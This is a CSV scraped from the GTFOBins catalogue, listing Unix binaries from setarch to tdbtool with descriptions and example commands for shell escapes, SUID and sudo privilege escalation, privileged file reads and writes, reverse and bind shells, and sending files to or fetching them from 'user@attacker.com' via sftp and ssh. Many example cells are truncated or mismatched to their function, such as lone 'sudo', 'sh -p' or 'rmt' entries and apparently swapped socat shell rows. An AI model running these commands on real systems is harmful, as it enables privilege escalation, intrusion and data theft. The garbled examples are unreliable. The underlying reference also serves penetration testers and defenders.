Binary,Function Name,Function URL,Description,Example
setarch,Shell,https://gtfobins.github.io/gtfobins/setarch/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,setarch $(arch) /bin/sh
setarch,SUID,https://gtfobins.github.io/gtfobins/setarch/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
setarch,Sudo,https://gtfobins.github.io/gtfobins/setarch/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
setfacl,SUID,https://gtfobins.github.io/gtfobins/setfacl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
setfacl,Sudo,https://gtfobins.github.io/gtfobins/setfacl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
setlock,Shell,https://gtfobins.github.io/gtfobins/setlock/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
setlock $TF /bin/sh"
setlock,SUID,https://gtfobins.github.io/gtfobins/setlock/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
setlock,Sudo,https://gtfobins.github.io/gtfobins/setlock/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sftp,Shell,https://gtfobins.github.io/gtfobins/sftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"HOST=user@attacker.com
sftp $HOST
!/bin/sh"
sftp,File upload,https://gtfobins.github.io/gtfobins/sftp/#file-upload,It can exfiltrate files on the network.,"RHOST=user@attacker.com
sftp $RHOST
put file_to_send file_to_save"
sftp,File download,https://gtfobins.github.io/gtfobins/sftp/#file-download,It can download remote files.,"RHOST=user@attacker.com
sftp $RHOST
get file_to_get file_to_save"
sftp,Sudo,https://gtfobins.github.io/gtfobins/sftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sg,Shell,https://gtfobins.github.io/gtfobins/sg/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,sg $(id -ng)
sg,Sudo,https://gtfobins.github.io/gtfobins/sg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
shuf,File write,https://gtfobins.github.io/gtfobins/shuf/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
shuf -e DATA -o ""$LFILE"""
shuf,File read,https://gtfobins.github.io/gtfobins/shuf/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
shuf -z ""$LFILE"""
shuf,SUID,https://gtfobins.github.io/gtfobins/shuf/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
shuf,Sudo,https://gtfobins.github.io/gtfobins/shuf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
slsh,Shell,https://gtfobins.github.io/gtfobins/slsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"slsh -e 'system(""/bin/sh"")'"
slsh,Sudo,https://gtfobins.github.io/gtfobins/slsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
slsh,Limited SUID,https://gtfobins.github.io/gtfobins/slsh/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
smbclient,Shell,https://gtfobins.github.io/gtfobins/smbclient/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"smbclient '\\attacker\share'
!/bin/sh"
smbclient,File upload,https://gtfobins.github.io/gtfobins/smbclient/#file-upload,It can exfiltrate files on the network.,sudo smbserver.py share /tmp
smbclient,File download,https://gtfobins.github.io/gtfobins/smbclient/#file-download,It can download remote files.,sudo smbserver.py share /tmp
smbclient,Sudo,https://gtfobins.github.io/gtfobins/smbclient/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
snap,Sudo,https://gtfobins.github.io/gtfobins/snap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
socat,Shell,https://gtfobins.github.io/gtfobins/socat/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,socat stdin exec:/bin/sh
socat,Reverse shell,https://gtfobins.github.io/gtfobins/socat/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
socat,Bind shell,https://gtfobins.github.io/gtfobins/socat/#bind-shell,It can bind a shell to a local port to allow remote network access.,"socat FILE:`tty`,raw,echo=0 TCP:target.com:12345"
socat,File upload,https://gtfobins.github.io/gtfobins/socat/#file-upload,It can exfiltrate files on the network.,"socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat"
socat,File download,https://gtfobins.github.io/gtfobins/socat/#file-download,It can download remote files.,"socat -u file:file_to_send tcp-listen:12345,reuseaddr"
socat,File write,https://gtfobins.github.io/gtfobins/socat/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
socat -u 'exec:echo DATA' ""open:$LFILE,creat"""
socat,File read,https://gtfobins.github.io/gtfobins/socat/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
socat -u ""file:$LFILE"" -"
socat,Sudo,https://gtfobins.github.io/gtfobins/socat/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
socat,Limited SUID,https://gtfobins.github.io/gtfobins/socat/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
socket,Reverse shell,https://gtfobins.github.io/gtfobins/socket/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
socket,Bind shell,https://gtfobins.github.io/gtfobins/socket/#bind-shell,It can bind a shell to a local port to allow remote network access.,nc target.com 12345
soelim,File read,https://gtfobins.github.io/gtfobins/soelim/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
soelim ""$LFILE"""
soelim,SUID,https://gtfobins.github.io/gtfobins/soelim/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
soelim,Sudo,https://gtfobins.github.io/gtfobins/soelim/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
softlimit,Shell,https://gtfobins.github.io/gtfobins/softlimit/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,softlimit /bin/sh
softlimit,SUID,https://gtfobins.github.io/gtfobins/softlimit/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
softlimit,Sudo,https://gtfobins.github.io/gtfobins/softlimit/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sort,File read,https://gtfobins.github.io/gtfobins/sort/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
sort -m ""$LFILE"""
sort,SUID,https://gtfobins.github.io/gtfobins/sort/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sort,Sudo,https://gtfobins.github.io/gtfobins/sort/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
split,Shell,https://gtfobins.github.io/gtfobins/split/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,split --filter=/bin/sh /dev/stdin
split,Command,https://gtfobins.github.io/gtfobins/split/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND=id
TF=$(mktemp)
split --filter=$COMMAND $TF"
split,File write,https://gtfobins.github.io/gtfobins/split/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",xaa
split,File read,https://gtfobins.github.io/gtfobins/split/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
TF=$(mktemp)
split $LFILE $TF
cat $TF*"
split,Sudo,https://gtfobins.github.io/gtfobins/split/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sqlite3,Shell,https://gtfobins.github.io/gtfobins/sqlite3/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,sqlite3 /dev/null '.shell /bin/sh'
sqlite3,File write,https://gtfobins.github.io/gtfobins/sqlite3/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
sqlite3 /dev/null -cmd "".output $LFILE"" 'select ""DATA"";'"
sqlite3,File read,https://gtfobins.github.io/gtfobins/sqlite3/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
sqlite3 << EOF
CREATE TABLE t(line TEXT);
.import $LFILE t
SELECT * FROM t;
EOF"
sqlite3,SUID,https://gtfobins.github.io/gtfobins/sqlite3/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sqlite3,Sudo,https://gtfobins.github.io/gtfobins/sqlite3/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sqlite3,Limited SUID,https://gtfobins.github.io/gtfobins/sqlite3/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
sqlmap,Shell,https://gtfobins.github.io/gtfobins/sqlmap/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')"""
sqlmap,Sudo,https://gtfobins.github.io/gtfobins/sqlmap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ss,File read,https://gtfobins.github.io/gtfobins/ss/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ss -a -F $LFILE"
ss,SUID,https://gtfobins.github.io/gtfobins/ss/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ss,Sudo,https://gtfobins.github.io/gtfobins/ss/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh-agent,Shell,https://gtfobins.github.io/gtfobins/ssh-agent/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ssh-agent /bin/sh
ssh-agent,SUID,https://gtfobins.github.io/gtfobins/ssh-agent/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ssh-agent,Sudo,https://gtfobins.github.io/gtfobins/ssh-agent/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh-keygen,Library load,https://gtfobins.github.io/gtfobins/ssh-keygen/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,ssh-keygen -D ./lib.so
ssh-keygen,SUID,https://gtfobins.github.io/gtfobins/ssh-keygen/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ssh-keygen,Sudo,https://gtfobins.github.io/gtfobins/ssh-keygen/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh-keyscan,File read,https://gtfobins.github.io/gtfobins/ssh-keyscan/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ssh-keyscan -f $LFILE"
ssh-keyscan,SUID,https://gtfobins.github.io/gtfobins/ssh-keyscan/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ssh-keyscan,Sudo,https://gtfobins.github.io/gtfobins/ssh-keyscan/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ssh,Shell,https://gtfobins.github.io/gtfobins/ssh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,ssh localhost $SHELL --noprofile --norc
ssh,File upload,https://gtfobins.github.io/gtfobins/ssh/#file-upload,It can exfiltrate files on the network.,"HOST=user@attacker.com
RPATH=file_to_save
LPATH=file_to_send
ssh $HOST ""cat > $RPATH"" < $LPATH"
ssh,File download,https://gtfobins.github.io/gtfobins/ssh/#file-download,It can download remote files.,"HOST=user@attacker.com
RPATH=file_to_get
LPATH=file_to_save
ssh $HOST ""cat $RPATH"" > $LPATH"
ssh,File read,https://gtfobins.github.io/gtfobins/ssh/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ssh -F $LFILE localhost"
ssh,Sudo,https://gtfobins.github.io/gtfobins/ssh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sshpass,Shell,https://gtfobins.github.io/gtfobins/sshpass/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,sshpass /bin/sh
sshpass,SUID,https://gtfobins.github.io/gtfobins/sshpass/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sshpass,Sudo,https://gtfobins.github.io/gtfobins/sshpass/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
start-stop-daemon,Shell,https://gtfobins.github.io/gtfobins/start-stop-daemon/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,start-stop-daemon -n $RANDOM -S -x /bin/sh
start-stop-daemon,SUID,https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
start-stop-daemon,Sudo,https://gtfobins.github.io/gtfobins/start-stop-daemon/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
stdbuf,Shell,https://gtfobins.github.io/gtfobins/stdbuf/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,stdbuf -i0 /bin/sh
stdbuf,SUID,https://gtfobins.github.io/gtfobins/stdbuf/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
stdbuf,Sudo,https://gtfobins.github.io/gtfobins/stdbuf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
strace,Shell,https://gtfobins.github.io/gtfobins/strace/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,strace -o /dev/null /bin/sh
strace,File write,https://gtfobins.github.io/gtfobins/strace/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",strace - DATA
strace,SUID,https://gtfobins.github.io/gtfobins/strace/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
strace,Sudo,https://gtfobins.github.io/gtfobins/strace/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
strings,File read,https://gtfobins.github.io/gtfobins/strings/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
strings ""$LFILE"""
strings,SUID,https://gtfobins.github.io/gtfobins/strings/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
strings,Sudo,https://gtfobins.github.io/gtfobins/strings/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
su,Sudo,https://gtfobins.github.io/gtfobins/su/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sudo,Sudo,https://gtfobins.github.io/gtfobins/sudo/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sysctl,Command,https://gtfobins.github.io/gtfobins/sysctl/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='/bin/sh -c id>/tmp/id'
sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id"
sysctl,File read,https://gtfobins.github.io/gtfobins/sysctl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",-p
sysctl,SUID,https://gtfobins.github.io/gtfobins/sysctl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sysctl,Sudo,https://gtfobins.github.io/gtfobins/sysctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
systemctl,SUID,https://gtfobins.github.io/gtfobins/systemctl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
systemctl,Sudo,https://gtfobins.github.io/gtfobins/systemctl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
systemd-resolve,Sudo,https://gtfobins.github.io/gtfobins/systemd-resolve/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tac,File read,https://gtfobins.github.io/gtfobins/tac/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tac -s 'RANDOM' ""$LFILE"""
tac,SUID,https://gtfobins.github.io/gtfobins/tac/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tac,Sudo,https://gtfobins.github.io/gtfobins/tac/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tail,File read,https://gtfobins.github.io/gtfobins/tail/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tail -c1G ""$LFILE"""
tail,SUID,https://gtfobins.github.io/gtfobins/tail/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tail,Sudo,https://gtfobins.github.io/gtfobins/tail/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tar,Shell,https://gtfobins.github.io/gtfobins/tar/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar,File upload,https://gtfobins.github.io/gtfobins/tar/#file-upload,It can exfiltrate files on the network.,rmt
tar,File download,https://gtfobins.github.io/gtfobins/tar/#file-download,It can download remote files.,rmt
tar,File write,https://gtfobins.github.io/gtfobins/tar/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
TF=$(mktemp)
echo DATA > ""$TF""
tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P"
tar,File read,https://gtfobins.github.io/gtfobins/tar/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'"
tar,Sudo,https://gtfobins.github.io/gtfobins/tar/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tar,Limited SUID,https://gtfobins.github.io/gtfobins/tar/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
task,Shell,https://gtfobins.github.io/gtfobins/task/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,task execute /bin/sh
task,Sudo,https://gtfobins.github.io/gtfobins/task/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
taskset,Shell,https://gtfobins.github.io/gtfobins/taskset/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,taskset 1 /bin/sh
taskset,SUID,https://gtfobins.github.io/gtfobins/taskset/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
taskset,Sudo,https://gtfobins.github.io/gtfobins/taskset/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tasksh,Shell,https://gtfobins.github.io/gtfobins/tasksh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"tasksh
!/bin/sh"
tasksh,Sudo,https://gtfobins.github.io/gtfobins/tasksh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tasksh,Limited SUID,https://gtfobins.github.io/gtfobins/tasksh/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
tbl,File read,https://gtfobins.github.io/gtfobins/tbl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
tbl $LFILE"
tbl,SUID,https://gtfobins.github.io/gtfobins/tbl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tbl,Sudo,https://gtfobins.github.io/gtfobins/tbl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tclsh,Shell,https://gtfobins.github.io/gtfobins/tclsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr"
tclsh,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/tclsh/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
tclsh,SUID,https://gtfobins.github.io/gtfobins/tclsh/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
tclsh,Sudo,https://gtfobins.github.io/gtfobins/tclsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tcpdump,Command,https://gtfobins.github.io/gtfobins/tcpdump/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='id'
TF=$(mktemp)
echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF"
tcpdump,Sudo,https://gtfobins.github.io/gtfobins/tcpdump/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
tdbtool,Shell,https://gtfobins.github.io/gtfobins/tdbtool/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"tdbtool
! /bin/sh"
tdbtool,Sudo,https://gtfobins.github.io/gtfobins/tdbtool/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
